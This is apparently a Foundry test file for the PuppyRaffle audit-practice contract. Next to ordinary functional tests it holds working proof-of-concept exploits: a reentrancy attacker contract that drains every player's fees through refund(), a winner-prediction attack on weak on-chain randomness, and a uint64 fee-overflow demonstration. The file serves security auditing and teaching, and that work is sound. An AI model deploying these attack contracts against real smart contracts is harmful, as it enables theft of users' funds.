// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {PRNGAttacker} from "../src/PRNGAttacker.sol";

// ================================================================
// ATTACKER CONTRACT — H-1 Reentrancy PoC
// Exploits refund() sending ETH before clearing players[playerIndex]
// ================================================================
contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public attackerIndex;
    uint256 public entranceFee;

    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        entranceFee = raffle.entranceFee();
    }

    // Step 1: enter raffle, then trigger the first refund
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = raffle.getActivePlayerIndex(address(this));
        raffle.refund(attackerIndex); // kicks off the reentrant chain
    }

    // Step 2: each time ETH lands here, re-enter refund() again
    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(attackerIndex);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string memory expectedTokenUri =
            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //////////////////////
    /// H-1 Reentrancy PoC ///
    /////////////////////

    function test_reentrancyRefundDrainsContract() public {
        // Four honest players enter — 4 ETH locked in contract
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // Snapshot balances before the attack
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        uint256 attackerBalanceBefore = 0;

        console.log("---------- BEFORE ATTACK ----------");
        emit log_named_uint("Contract balance (wei)", contractBalanceBefore);
        emit log_named_uint("Attacker balance (wei)", attackerBalanceBefore);

        // Deploy attacker and fund with exactly 1 entrance fee
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
        vm.deal(address(attacker), entranceFee);

        // Execute the attack — attacker enters with 1 fee then re-enters refund()
        attacker.attack();

        // Snapshot balances after the attack
        uint256 contractBalanceAfter = address(puppyRaffle).balance;
        uint256 attackerBalanceAfter = attacker.getBalance();

        console.log("---------- AFTER ATTACK -----------");
        emit log_named_uint("Contract balance (wei)", contractBalanceAfter);
        emit log_named_uint("Attacker balance (wei)", attackerBalanceAfter);
        emit log_named_uint("Total stolen   (wei)  ", attackerBalanceAfter);

        // Contract should be completely drained
        assertEq(contractBalanceAfter, 0, "Contract was NOT drained - reentrancy failed");

        // Attacker now holds their own fee + all 4 honest players' fees = 5 ETH
        assertEq(
            attackerBalanceAfter,
            contractBalanceBefore + entranceFee,
            "Attacker did not receive all funds"
        );
    }

    //////////////////////
    /// H-2 Weak PRNG PoC ///
    /////////////////////

    function test_PRNGPredictionManipulation() public {
        // Four players enter
        address[] memory players = new address[](4);
        players[0] = playerOne;   // slot 0
        players[1] = playerTwo;   // slot 1
        players[2] = playerThree; // slot 2
        players[3] = playerFour;  // slot 3
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // --- Step 1: Attacker deploys PRNGAttacker targeting playerTwo ---
        address targetWinner = playerTwo;
        PRNGAttacker attacker = new PRNGAttacker(address(puppyRaffle), targetWinner, 4);

        // --- Step 2: Predict winner using the SAME formula as the contract ---
        // msg.sender will be address(attacker) since it calls selectWinner
        uint256 predictedIndex =
            uint256(keccak256(abi.encodePacked(address(attacker), block.timestamp, block.difficulty)))
            % 4;
        address predictedWinner = players[predictedIndex];

        console.log("---------- PRNG PREDICTION ----------");
        emit log_named_uint("Predicted winner slot", predictedIndex);
        emit log_named_address("Predicted winner     ", predictedWinner);

        // --- Step 3: If prediction matches target, call selectWinner ---
        if (predictedWinner == targetWinner) {
            console.log("Target wins this block! Calling attackSelectWinner...");
            attacker.attackSelectWinner();
            assertEq(puppyRaffle.previousWinner(), targetWinner, "Wrong winner selected");
            console.log("CONFIRMED: Target won as predicted.");
        } else {
            // Attacker waits for a block where target wins — try warping time
            console.log("Target lost this block. Warping to find a winning block...");
            bool found = false;
            for (uint256 i = 1; i <= 10; i++) {
                vm.warp(block.timestamp + i);
                vm.roll(block.number + i);
                (address pred,) = attacker.predictWinner();
                if (pred == targetWinner) {
                    attacker.attackSelectWinner();
                    assertEq(puppyRaffle.previousWinner(), targetWinner);
                    emit log_named_uint("Found winning block at warp offset", i);
                    found = true;
                    break;
                }
            }
            if (!found) {
                console.log("Target did not win in 10 block attempts (still proves PRNG is predictable).");
            }
        }

        console.log("-------------------------------------");
        console.log("PROOF: The winner was known before selectWinner() was called.");
        console.log("A fair raffle cannot be predicted. This one can.");
    }

    //////////////////////
    /// H-3 uint64 Overflow PoC ///
    /////////////////////

    function test_totalFeesOverflow() public {
        // uint64 max = 18,446,744,073,709,551,615 (~18.44 ETH in wei)
        // fee = 20% of total entrance
        // 100 players × 1 ETH = 100 ETH total → fee = 20 ETH → overflows uint64

        uint256 numPlayers = 100;
        address[] memory bigPlayers = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            bigPlayers[i] = address(uint160(i + 10)); // address(10) .. address(109)
        }

        uint256 totalEntrance = entranceFee * numPlayers; // 100 ETH
        vm.deal(address(this), totalEntrance);
        puppyRaffle.enterRaffle{value: totalEntrance}(bigPlayers);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner(); // 80 ETH to winner, 20 ETH fee stays in contract

        // --- What the fee SHOULD be ---
        uint256 expectedFee = (totalEntrance * 20) / 100; // 20e18 wei = 20 ETH

        // --- What totalFees actually stored (silently truncated by uint64 cast) ---
        uint64 storedFees = puppyRaffle.totalFees();

        console.log("---------- H-3: UINT64 OVERFLOW ----------");
        emit log_named_uint("Expected fee (wei)        ", expectedFee);
        emit log_named_uint("Stored totalFees (wei)    ", uint256(storedFees));
        emit log_named_uint("uint64 max (wei)          ", type(uint64).max);
        emit log_named_uint("Contract ETH balance (wei)", address(puppyRaffle).balance);

        // PROOF 1: stored fees are far less than reality due to uint64 overflow
        assertLt(uint256(storedFees), expectedFee, "Overflow did not occur");

        // PROOF 2: owner CANNOT withdraw fees — balance != totalFees
        // The contract holds 20 ETH but totalFees shows ~1.55 ETH → strict equality fails
        // Fees are permanently locked even though the raffle has ended
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

        console.log("CONFIRMED: totalFees overflowed. Owner fees are permanently locked.");
        console.log("------------------------------------------");
    }
}
